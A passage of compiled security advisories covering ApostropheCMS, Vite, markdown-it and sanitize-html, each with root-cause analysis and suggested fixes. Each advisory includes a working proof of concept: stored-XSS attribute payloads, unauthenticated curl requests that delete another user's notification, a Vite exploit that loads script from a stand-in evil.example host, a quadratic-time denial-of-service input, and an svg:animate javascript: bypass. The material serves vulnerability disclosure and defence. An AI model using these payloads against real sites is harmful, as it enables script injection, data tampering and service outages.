      try {
        const probe = await apos.http.get(candidate, { fullResponse: true });
        if (probe.status === 200) {
          bruteForced = candidate;
          break;
        }
      } catch (e) {
        if (e.status !== 404) throw e;
      }
    }
    assert.ok(bruteForced, 'brute force within ±3s failed');

    const express = apos.modules['@apostrophecms/express'];
    const base = `http://${express.address}:${express.port}`;
    const ext = await fetch(`${base}${bruteForced}`);
    assert.equal(ext.status, 200);
    const bytes = await ext.arrayBuffer();
    assert.ok(bytes.byteLength > 100);

    console.log('OK: unauthenticated download', {
      fileName,
      bruteForced,
      bytes: bytes.byteLength,
      listenUrl: base
    });
  } finally {
    if (apos) {
      await t.destroy(apos);
    }
  }
})().catch((err) => {
  console.error(err);
  process.exit(1);
});
NODE
```

**Expected output:** a line similar to  
`OK: unauthenticated download { fileName: 'poc-export-site-article-export-….tar.gz', …, bytes: <number>, listenUrl: 'http://127.0.0.1:…' }`


## Impact

- **Confidentiality:** An unauthenticated remote party can obtain a full export tarball (documents, metadata, attachment references, and bundled files for gzip export) that was meant for the editor who ran export. Content matches what that user was allowed to export, but the downloader does not need their session.
- **Not in scope:** The attacker cannot trigger export on their own (that still requires a logged-in user with export rights). Integrity and availability of the site are unchanged.

## Summary

ApostropheCMS widget styles support project-defined schema fields. If a project defines a free-form `string` style field with a CSS `property` and no selector, an editor-controlled value is rendered as an inline CSS declaration. The resulting declaration is then inserted into the widget wrapper's `style="..."` attribute without HTML-attribute escaping.

An attacker who can edit the widget can include a double quote in the style value, terminate the `style` attribute, and inject new HTML event-handler attributes. The payload is stored with the widget and executes in the Apostrophe site origin whenever the affected published page is rendered.

This is a sibling of CVE-2026-33889 / `GHSA-97v6-998m-fp4g`. The earlier issue escaped from a `<style>` element through a malicious color value. This variant reaches a different sink related to the automatically generated widget wrapper's inline `style` and `class` attributes.

## Details

### Root Cause 1: Free-form string style values retain HTML metacharacters

The standard string field converter uses `launder.string()` and length validation. This performs type normalization, not output encoding for an HTML attribute context:

[`packages/apostrophe/modules/@apostrophecms/schema/lib/addFieldTypes.js:296-333`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/schema/lib/addFieldTypes.js#L296-L333)

```javascript
self.addFieldType({
  name: 'string',
  // ...
  convert(req, field, data, destination) {
    destination[field.name] = self.apos.launder.string(data[field.name]);
    destination[field.name] = checkStringLength(
      destination[field.name],
      field.min,
      field.max
    );
  }
});
```

Quotes therefore remain in a value supplied through a style field.

### Root Cause 2: The value is converted into inline CSS without value validation

For a field with `property` but no `selector` or media query, `renderScopedStyles()` selects inline rendering. The generic extractor concatenates the configured property and editor-controlled value:

[`packages/apostrophe/modules/@apostrophecms/styles/ui/apos/universal/render.mjs:171-228`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/styles/ui/apos/universal/render.mjs#L171-L228)

[`packages/apostrophe/modules/@apostrophecms/styles/ui/apos/universal/render.mjs:598-647`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/styles/ui/apos/universal/render.mjs#L598-L647)

```javascript
rule = `${property}: ${normalized.value}${normalized.unit}`;

// ...

if (isInline) {
  return {
    css: '',
    classes: [ ...storage.classes ],
    inline: stringifyRules(storage.styles, true)
  };
}
```

For example, the value below becomes part of a `font-family` declaration:

```text
serif" tabindex="0" autofocus onfocus="document.body.dataset.inline='executed'
```

### Root Cause 3: Attribute values are serialized without HTML escaping

`getWidgetAttributes()` places the inline CSS into an attribute tuple, then concatenates every tuple into `key="value"` without encoding `&`, `<`, `>`, `'`, or `"`:

[`packages/apostrophe/modules/@apostrophecms/styles/lib/methods.js:251-322`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/styles/lib/methods.js#L251-L322)

```javascript
if (styleParts.length) {
  attrs.push(
    [ 'style', `${styleParts.join(';')};` ]
  );
}

if (options.asObject) {
  return Object.fromEntries(attrs);
}

return attrs
  .map(([ key, value ]) => `${key}="${value}"`)
  .join(' ');
```

The same raw serializer also makes a project-defined free-form `string` style with `class: true` a potential sibling path, because the string is added to `classes` and later serialized into `class="..."`. The inline-property path was the path dynamically verified.

### Root Cause 4: The unsafe string is used by the automatic public wrapper

Styled widgets use `getWidgetAttributes()` to create a wrapper around the rendered widget:

[`packages/apostrophe/modules/@apostrophecms/widget-type/index.js:448-457`](https://github.com/apostrophecms/apostrophe/blob/aa5170c7df9ff9ea5ac2e72a008f12e28dae6ca8/packages/apostrophe/modules/%40apostrophecms/widget-type/index.js#L448-L457)

```javascript
if (hasStyles && self.options.stylesWrapper !== false) {
  const styles = self.apos.styles.prepareWidgetStyles(widget);
  const styleTag = self.apos.styles
    .getWidgetElements(styles, { scene: req.scene });
  const wrapperAttrs = self.apos.styles.getWidgetAttributes(styles);

  return `${styleTag}<div${wrapperAttrs ? ' ' + wrapperAttrs : ''}>${markup}</div>`;
}
```

Consequently, the injected attribute is present on normal public page renders, not only in the editor UI.

### Why the CVE-2026-33889 defense does not prevent this variant

The sibling advisory led to a defense in `getWidgetElements()` that rewrites `</` before CSS is inserted into a `<style>` element:

```javascript
css = css.replaceAll('</', '<\\/');
```

This protects the style-element boundary. The vulnerable path above produces `inline` output instead of `css`, so it never reaches that replacement.

## Affected Configurations and Versions

The verified configuration has all of the following properties:

- A widget defines a style field with a free-form type such as `string`.
- The field uses `property` without a selector, causing inline-style rendering, or uses `class: true` with an unrestricted string value.
- The attacker has permission to edit a widget containing the field.
- The malicious content is published, or a higher-privileged user views the affected draft.

Standard range, select, and color presets do not directly provide an unrestricted quote-containing value and were not demonstrated as affected by this variant.

## Proof of Concept

### Step 1: Configure a widget with a free-form inline style

Add a style field similar to the following to a widget module:

```javascript
module.exports = {
  extend: '@apostrophecms/widget-type',
  options: {
    label: 'Style Attribute Test'
  },
  styles: {
    add: {
      customFont: {
        type: 'string',
        label: 'Custom Font',
        property: 'font-family'
      }
    }
  }
};
```

The absence of `selector` makes the generated declaration inline.

### Step 2: Store the payload

As a user who may edit this widget, enter the following value in `customFont` and save the widget:

```text
serif" tabindex="0" autofocus onfocus="document.body.dataset.inline='executed'
```

Publish the page, or have another user view the affected draft.

### Step 3: Reproduce the renderer output directly

The vulnerable data flow can also be reproduced using the real renderer and serializer from a checked-out, dependency-installed repository:

```javascript
const methodsFactory = require(
  './packages/apostrophe/modules/@apostrophecms/styles/lib/methods.js'
);

(async () => {
  const { renderScopedStyles } = await import(
    './packages/apostrophe/modules/@apostrophecms/styles/ui/apos/universal/render.mjs'
  );

  const payload =
    'serif" tabindex="0" autofocus ' +
    'onfocus="document.body.dataset.inline=\'executed\'';

  const styles = renderScopedStyles(
    [ {
      name: 'customFont',
      type: 'string',
      property: 'font-family'
    } ],
    { customFont: payload }
  );

  Object.assign(styles, {
    styleId: 'audit-inline',
    widgetId: 'widget-1'
  });

  const attrs = methodsFactory({}, {}).getWidgetAttributes(styles);
  console.log('inline:', styles.inline);
  console.log('attributes:', attrs);
})();
```

### Step 4: Observe the unsafe HTML

The current renderer produced:

```text
inline: font-family: serif" tabindex="0" autofocus onfocus="document.body.dataset.inline='executed';
```

The serializer then produced an attribute string equivalent to:

```html
id="audit-inline"
data-apos-widget-style-wrapper-for="widget-1"
data-apos-widget-style-classes=""
style="font-family: serif" tabindex="0" autofocus
onfocus="document.body.dataset.inline='executed';"
```

The attacker-controlled quote terminates the `style` attribute. `tabindex`, `autofocus`, and `onfocus` become separate live attributes.

### Step 5: Confirm execution in a browser

When the generated wrapper was loaded in Chrome 153, autofocus triggered the injected handler automatically. The DOM changed to:

```html
<body data-inline="executed">
  <div id="audit-inline" tabindex="0" autofocus="" onfocus="..."></div>
</body>
```

The safe behavior would be for the quote to appear as `&quot;` inside the `style` attribute, with no injected attributes and no change to `document.body.dataset`.

## Impact

- **Stored XSS on published pages:** JavaScript executes for unauthenticated visitors who load a page containing the affected widget.
- **Privilege escalation:** If an administrator or another privileged editor views the page or draft, the payload executes with that user's application-origin privileges and can perform authenticated actions available to the victim.
- **Persistent content manipulation:** The payload is stored with widget content and continues to execute until the style value is removed or the output path is fixed.
- **Phishing and data access:** The script can alter the rendered page, read non-HttpOnly same-origin data, and issue same-origin requests as the victim.

## Recommended Fix

### Fix 1: HTML-escape every string-returning attribute value

The string branch of `getWidgetAttributes()` should encode values for a double-quoted HTML attribute context before concatenation. At minimum, encode `&`, `<`, `>`, `"`, and `'` using a centralized Apostrophe HTML encoder.

Conceptually:

```javascript
if (options.asObject) {
  return Object.fromEntries(attrs);
}

return attrs
  .map(([ key, value ]) => {
    return `${key}="${escapeHtmlAttribute(String(value))}"`;
  })
  .join(' ');
```

The structured `asObject` branch should remain structured so that its eventual template/DOM renderer can perform context-appropriate encoding.

### Fix 2: Validate style values by their destination grammar

Output encoding is the primary fix. As defense in depth:

- Require select/range/color or another constrained type for common CSS properties.
- Parse and validate free-form CSS property values instead of treating them as arbitrary strings.
- For `class: true`, accept only individual valid class-name tokens rather than an unrestricted string.

#### 1. Summary
The API endpoint `POST /api/v1/@apostrophecms/import-export/clean-export` in `@apostrophecms/import-export` lacks authentication and authorization checks. Any client—including unauthenticated anonymous users who have obtained the standard CSRF cookie from visiting the site—can directly invoke this route and trigger the underlying `self.cleanExport(req)` method.

---

#### 2. Affected Files & Endpoints
* **Endpoint:** `POST /api/v1/@apostrophecms/import-export/clean-export`
* **Route Definition:** `packages/import-export/lib/apiRoutes.js` (lines 32–34)
* **Method Implementation:** `packages/import-export/lib/methods/import.js` (lines 1271–1324)

---

#### 3. Root Cause Analysis
In `packages/import-export/lib/apiRoutes.js`, the `get.related` handler explicitly validates that the caller is logged in:
```javascript
get: {
  async related(req) {
    if (!req.user) {
      throw self.apos.error('forbidden');
    }
    // ...
  }
}
```
In contrast, `post.cleanExport` (as well as `post.overrideDuplicates`) lacks any verification of `req.user`:
```javascript
post: {
  async overrideDuplicates(req) {
    return self.overrideDuplicates(req);
  },

  async cleanExport(req) {
    return self.cleanExport(req); // <-- No authentication check
  }
}
```
Because ApostropheCMS does not enforce authentication globally on all `apiRoutes`, omitting an explicit `if (!req.user)` guard allows anonymous requests to pass directly through to the business logic layer.

---

#### 4. Evidence
When sending an unauthenticated POST request with the site’s CSRF cookie (issued to any visitor on `GET /`), the request bypasses access control entirely and executes `self.cleanExport(req)`, as demonstrated by the server stack trace:

```text
at Object.cleanExport (.../packages/import-export/lib/methods/import.js)
at .../packages/apostrophe/modules/@apostrophecms/module/index.js:193:30
```
This confirms that execution directly reaches the core import-export handler without an authenticated session.

---

#### 5. Impact
1. **Broken Access Control:** Unauthenticated users can invoke cleanup operations and delete temporary export files and artifacts stored on the server.
2. **Unauthorized State Mutation:** The endpoint allows modifying job records in the database via `req.body.jobId` (forcing them to `ended: true, status: 'completed'`) and dismissing notifications via `req.body.notificationId` without verifying whether the resources belong to the requesting caller.

---

#### 6. Suggested Remediation (Patch)

Enforce an authentication check in `packages/import-export/lib/apiRoutes.js` before executing the underlying methods:

```diff
--- a/packages/import-export/lib/apiRoutes.js
+++ b/packages/import-export/lib/apiRoutes.js
@@ -26,10 +26,16 @@ module.exports = self => {
     get: { ... },
     post: {
       async overrideDuplicates(req) {
+        if (!req.user) {
+          throw self.apos.error('forbidden');
+        }
         return self.overrideDuplicates(req);
       },

       async cleanExport(req) {
+        if (!req.user) {
+          throw self.apos.error('forbidden');
+        }
         return self.cleanExport(req);
       }
     }
```

### Summary

When accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.

### Impact

Only apps that match the following conditions are affected:

- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.
- the transformed HTML contains an inline module script
- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions

### Details

[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:

```js
const url = req.originalUrl
template = await vite.transformIndexHtml(url, template)
```

For a development server at `http://localhost:5173`, an attacker can send this URL:

```text
http://localhost:5173//evil.example/payload.js?/../../package.json
```

In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.

Chromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.

[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:

```html
<script type="module" src="//evil.example/payload.js?/../../package.json?html-proxy&index=0.js"></script>
```

The generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.

### PoC

```js
import { createServer as createHttpServer } from 'node:http'
import { createRequire } from 'node:module'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const directory = dirname(fileURLToPath(import.meta.url))
const require = createRequire(join(directory, 'package.json'))
const { chromium } = require('playwright-chromium')
const viteModule = await import(
  pathToFileURL(require.resolve('vite')).href
)
const createViteServer =
  viteModule.createServer ?? viteModule.default.createServer

// This loopback server stands in for a separately hosted attacker website.
const attackerPort = 4173
const exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`
const html = '<script type="module">document.body.textContent = "Vite app"</script>'

const listen = (server, port = 0) =>
  new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(port, '127.0.0.1', () => {
      server.off('error', reject)
      resolve(server.address().port)
    })
  })

const close = (server) =>
  new Promise((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()))
  })

let attackerRequest = null
const attacker = createHttpServer((request, response) => {
  attackerRequest = request.url
  response.writeHead(200, {
    'access-control-allow-origin': '*',
    'content-type': 'text/javascript',
  })
  response.end(
    "document.documentElement.dataset.viteXssPoc = 'executed'",
  )
})

const vite = await createViteServer({
  appType: 'custom',
  configFile: false,
  root: directory,
  server: {
    hmr: false,
    middlewareMode: true,
    watch: null,
  },
})

const application = createHttpServer((request, response) => {
  vite.middlewares(request, response, async (error) => {
    if (error) {
      response.destroy(error)
      return
    }

    try {
      const transformed = await vite.transformIndexHtml(request.url, html)
      response.writeHead(200, { 'content-type': 'text/html' })
      response.end(transformed)
    } catch (transformError) {
      response.destroy(transformError)
    }
  })
})

await listen(attacker, attackerPort)
const applicationPort = await listen(application)
const browser = await chromium.launch({ headless: true })

try {
  const page = await browser.newPage()
  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)
  await page.waitForFunction(
    () => document.documentElement.dataset.viteXssPoc === 'executed',
  )

  console.log(`attacker request: ${attackerRequest}`)
  console.log('JavaScript from the attacker server executed in the Vite page')
} finally {
  await browser.close()
  await close(application)
  await vite.close()
  await close(attacker)
}
```

Observed output on Vite 8.2.1:
```text
attacker request: /payload.js?/../../package.json?html-proxy&index=0.js
JavaScript from the attacker server executed in the Vite page
```

### Summary

A link reference definition whose label or title is never closed is O(n²) in markdown-it 15.0.2 with default options. Continuation lines are pulled lazily with str += lineContent in src/rules_block/reference.ts, and the subsequent charCodeAt and slice calls flatten the V8 cons-string, copying everything collected so far; this runs before the rule decides the definition is invalid. It is a regression introduced by PR #1004 in 14.0.0: 13.0.2 processed a 313 KB input in 125 ms, while every version since takes about 11 seconds on the same input. At the sizes below, 200 KB takes 3.6 seconds, 400 KB takes 18.1 seconds, and 800 KB takes 74.0 seconds, which is roughly 4–5× per doubling. No options are required to trigger it.

### Details

src/rules_block/reference.ts appends continuation lines with str += lineContent at lines 74, 83, 100, 133, and 150, then keeps indexing the accumulated string via str.charCodeAt(pos) in the label and whitespace loops and str.slice(...) in parseLinkTitle. V8 represents += as a cons-string, and the next charCodeAt or slice flattens it, copying everything collected so far, so one definition spanning n lines costs O(n²). Isolation confirms the rule is responsible: block-only parsing with inline disabled is still quadratic, md.disable('reference') makes the same input linear, and the same text without the leading [ is linear. The fix is to track positions in state.src instead of building str, or to collect line slices in an array and parse across them. At minimum, stop scanning the label after 999 characters (CommonMark §6.3) before pulling more lines, and cap title continuation. Add a pathological test with a 100k-line unclosed title and label. Open PR #1215 edits the same file but its label check runs after the label loop, so it does not bound either variant and the fix can land together with that PR.

The observed output from PoC was:
unclosed title n=100000   200009 B    3585.5 ms
unclosed title n=200000   400009 B   18107.1 ms   (5.05x)
unclosed title n=400000   800009 B   73954.4 ms   (4.08x)

Regression comparison at 313 KB: 13.0.2 → 125 ms, 14.1.0 → 11.4 s, 15.0.0 → 10.6 s, 15.0.2 → 10.7 s.

### Proof of concept

How to execute the PoC:
1. mkdir -p markdown-it-poc && cd markdown-it-poc
2. npm init -y
3. npm i markdown-it@15.0.2
4. node poc_markdown_it.js

PoC below is:
```javascript
// poc_markdown_it.js
// Requires: npm install markdown-it@15.0.2
const MarkdownIt = require('markdown-it');
const md = new MarkdownIt();

function bench(label, src) {
  const t0 = process.hrtime.bigint();
  md.render(src);
  const t1 = process.hrtime.bigint();
  console.log(
    `${label.padEnd(30)} ${String(src.length).padStart(9)} B ${(Number(t1 - t0) / 1e6).toFixed(1).padStart(9)} ms`
  );
}

// Unclosed title: one reference definition spread over many lines
for (const n of [100000, 200000, 400000]) {
  bench(`unclosed title n=${n}`, '[a]: /u "' + 'x\n'.repeat(n));
}

// Unclosed label
for (const n of [5000, 10000, 20000]) {
  bench(`unclosed label n=${n}`, '[' + 'a\n'.repeat(n));
}
```

### Impact

This is an algorithmic-complexity denial of service (CWE-407). Any server that renders user Markdown with markdown-it is affected with default options, including comments, issues, chat, wikis, docs previews, and LLM chat UIs. A ~400 KB request body blocks the Node.js event loop for about 18 seconds and an ~800 KB body for about 74 seconds. This is the same class and attacker model as GHSA-253c, but it is reachable without any opt-in option, since the affected path is a core block rule.

## Summary

The notification module exposes `PATCH` and `DELETE` REST endpoints that perform operations directly on the underlying MongoDB collection without verifying that the requester is authenticated or owns the target notification.

As a result, an unauthenticated attacker who obtains a valid notification ID can modify or permanently delete another user's notification.

---

## Affected Code

**File**

```text
packages/apostrophe/modules/@apostrophecms/notification/index.js
```

```javascript
// restApiRoutes
async patch(req, _id) {
  const dismissed = self.apos.launder.boolean(req.body.dismissed);

  if (dismissed) {
    await self.emit('beforeSave', req, { _id, dismissed });

    await self.db.updateOne(
      { _id },
      {
        $set: { dismissed },
        $currentDate: { updatedAt: true }
      }
    );
  }
},

async delete(req, _id) {
  await self.db.deleteMany({ _id });
}
```

Unlike the `GET` notification route, these handlers do **not** verify:

- Authentication (`req.user`)
- Ownership (`userId === req.user._id`)
- Authorization or permissions

Instead, the supplied `_id` is used directly against the raw MongoDB collection.

---

## Root Cause

The notification REST endpoints perform database operations directly using `self.db` without enforcing authentication or authorization.

While the framework provides permission primitives (`req.user`, ownership checks, and `apos.permission`), these endpoints never invoke them. As a result, any request reaching these handlers is processed solely based on the supplied notification ID.

For comparison, the `GET` notification route correctly checks:

```javascript
if (!(req.user && req.user._id)) {
  throw self.apos.error('invalid');
}
```

No equivalent validation exists in the `PATCH` or `DELETE` handlers.

---

## Proof of Concept

### 1. Log in as an administrator

```bash
curl -sS -c admin_cookies.txt \
"http://localhost:4321/api/v1/@apostrophecms/login/context" \
-o /dev/null

curl -sS \
-b admin_cookies.txt \
-c admin_cookies.txt \
-X POST \
http://localhost:4321/api/v1/@apostrophecms/login/login \
-H "Content-Type: application/json" \
-H "X-XSRF-TOKEN: csrf" \
-d '{
  "username":"admin",
  "password":"AdminP@ssw0rd123!",
  "session":true
}'
```

---

### 2. Create a notification

```bash
curl -sS \
-b admin_cookies.txt \
-X POST \
http://localhost:4321/api/v1/@apostrophecms/notification \
-H "Content-Type: application/json" \
-H "X-XSRF-TOKEN: csrf" \
-d '{
  "message":"manual verify test",
  "type":"info"
}'
```

Example response:

```json
{
  "noteId":"p358r7phi2w8l245ww5130uf"
}
```

---

### 3. Verify the notification exists

```bash
curl -sS \
-b admin_cookies.txt \
"http://localhost:4321/api/v1/@apostrophecms/notification/p358r7phi2w8l245ww5130uf"
```

Response:

```json
{
  "notifications":[
    {
      "_id":"p358r7phi2w8l245ww5130uf",
      "userId":"i89h844o5n3nbreis0ugusum",
      "message":"manual verify test"
    }
  ],
  "dismissed":[]
}
```

---

### 4. Access the endpoint without authentication

Create a fresh cookie jar containing only the public CSRF cookie:

```bash
rm -f anon_cookies.txt

curl -sS \
-c anon_cookies.txt \
"http://localhost:4321/api/v1/@apostrophecms/login/context" \
-o /dev/null
```

Then send the request **without any authenticated session**:

```bash
curl -i \
-b anon_cookies.txt \
-X DELETE \
"http://localhost:4321/api/v1/@apostrophecms/notification/p358r7phi2w8l245ww5130uf" \
-H "X-XSRF-TOKEN: csrf"
```

Response:

```http
HTTP/1.1 200 OK
```

---

### 5. Verify the notification has been deleted

```bash
curl -sS \
-b admin_cookies.txt \
"http://localhost:4321/api/v1/@apostrophecms/notification/p358r7phi2w8l245ww5130uf"
```

Response:

```json
{
  "notifications":[],
  "dismissed":[]
}
```

The notification belonging to the authenticated administrator has been successfully deleted by an unauthenticated client.

---

## Impact

An attacker who obtains a valid notification ID can:

- Delete another user's notifications.
- Mark another user's notifications as dismissed.
- Suppress security-related or administrative notifications.

The vulnerability primarily affects **integrity**.

Although notification IDs are generated using CUID2 and are not practically guessable, authorization must not rely on identifier entropy. Any separate information disclosure vulnerability or log exposure that reveals notification IDs would make this issue directly exploitable.

---

## Recommended Fix

Require authentication before processing any modification request.

Additionally, scope all database operations to the authenticated user.

Example:

```javascript
// patch
async patch(req, _id) {
  if (!req.user) {
    throw self.apos.error('forbidden');
  }
  const dismissed = self.apos.launder.boolean(req.body.dismissed);
  if (dismissed) {
    await self.emit('beforeSave', req, { _id, dismissed });
    const result = await self.db.updateOne(
      { _id, userId: req.user._id },   // <-- ownership check
      { $set: { dismissed }, $currentDate: { updatedAt: true } }
    );
    if (!result.matchedCount) {
      throw self.apos.error('notfound');
    }
  }
},
// delete
async delete(req, _id) {
  if (!req.user) {
    throw self.apos.error('forbidden');
  }
  const result = await self.db.deleteMany({ _id, userId: req.user._id });
  if (!result.deletedCount) {
    throw self.apos.error('notfound');
  }
}
```

Similarly, update the `PATCH` handler to verify both authentication and ownership before updating notification records.

---

## Recommendation

Every notification modification endpoint should:

- Require authentication.
- Verify ownership (`userId === req.user._id`).
- Return `403 Forbidden` for unauthorized requests.
- Avoid performing database operations solely using a user-controlled `_id`.

The same authorization checks should also be applied to any internal helper methods (such as `dismiss()`) that modify notification state.

## Summary

sanitize-html 2.17.7 introduced `animatesUrlAttribute()` to block SVG animation elements (`animate`, `animateColor`, `animateMotion`, `animateTransform`, `set`) when their `attributeName` targets a URL sink like `href`. However, this check is bypassed when the animation element uses a namespace prefix (e.g., `svg:animate` instead of `animate`).

## Root Cause

The `animatesUrlAttribute` function (index.js, line ~832) checks `svgAnimationTags.indexOf(name.toLowerCase())`, where `svgAnimationTags` contains bare local names: `["animate", "animatecolor", "animatemotion", "animatetransform", "set"]`. htmlparser2 passes namespace-prefixed tag names verbatim, so `svg:animate` does not match `animate` in the array, causing the function to return `false` and skip the SMIL XSS protection.

Ironically, the function already handles namespace prefixes correctly for the `attributeName` target value (line ~843): `const localName = target.slice(target.lastIndexOf(":") + 1)` — but this same stripping was not applied to the tag name itself.

## Proof of Concept

```javascript
const sanitizeHtml = require("sanitize-html");

const config = {
  allowedTags: false,
  allowedAttributes: false,
  allowedSchemes: ["http", "https"]
};

// Standard animate — BLOCKED by 2.17.7 fix
const blocked = sanitizeHtml(
  `<svg><a href="#safe"><animate attributeName="href" values="#safe;javascript:alert(1)" dur=".01s" fill="freeze"/><text>Click</text></a></svg>`,
  config
);
console.log("Standard animate:", blocked.includes("javascript:") ? "BYPASS" : "BLOCKED");
// Output: BLOCKED

// Namespace-prefixed animate — BYPASSES the fix
const bypassed = sanitizeHtml(
  `<svg><a href="#safe"><svg:animate attributeName="href" values="#safe;javascript:alert(document.domain)" dur=".01s" fill="freeze"/><text>Click</text></a></svg>`,
  config
);
console.log("svg:animate:", bypassed.includes("javascript:") ? "BYPASS" : "BLOCKED");
// Output: BYPASS
```

All 5 SMIL animation elements are bypassable with any namespace prefix (`svg:`, `xlink:`, `xml:`, uppercase variants). Tested and confirmed on sanitize-html 2.17.7 from the apostrophe monorepo.

## Impact

Cross-site scripting (XSS) via SMIL animation retargeting. When an application uses `allowedTags: false` (common in rich-text editors that want to preserve SVG), an attacker can inject `<svg:animate attributeName="href" values="#safe;javascript:..." .../>` to override the `href` attribute of a parent `<a>` element after the page loads, causing the link to execute JavaScript when clicked.

## Suggested Fix

Strip the namespace prefix from the tag name before the lookup, matching the pattern already used for the attribute name target:

```javascript
// Before (vulnerable):
if (svgAnimationTags.indexOf(name.toLowerCase()) === -1) {

// After (fixed):
const localTagName = name.toLowerCase().slice(name.lastIndexOf(":") + 1);
if (svgAnimationTags.indexOf(localTagName) === -1) {
```

## Affected Versions

sanitize-html >= 2.17.7 (where the SMIL animation protection was introduced). Earlier versions lack the SMIL protection entirely.

